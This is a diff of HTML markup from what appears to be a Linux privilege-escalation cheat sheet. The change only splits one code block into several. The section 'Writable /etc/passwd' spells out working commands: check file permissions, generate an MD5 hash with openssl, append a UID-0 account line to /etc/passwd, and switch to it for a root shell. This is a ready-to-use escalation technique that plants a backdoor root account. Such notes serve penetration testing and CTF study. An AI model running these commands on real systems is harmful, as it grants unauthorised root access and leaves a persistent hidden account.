@@ -48,14 +48,11 @@
 <h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
 </span></span><span class="line"><span class="cl">ls -l /etc/passwd /etc/shadow
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Create password hash</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create password hash</span>
 </span></span><span class="line"><span class="cl">openssl passwd -1 password
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Add to /etc/passwd</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add to /etc/passwd</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Get root shell</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get root shell</span>
 </span></span><span class="line"><span class="cl">su - user
 </span></span></code></pre></div><br></div></div>
     
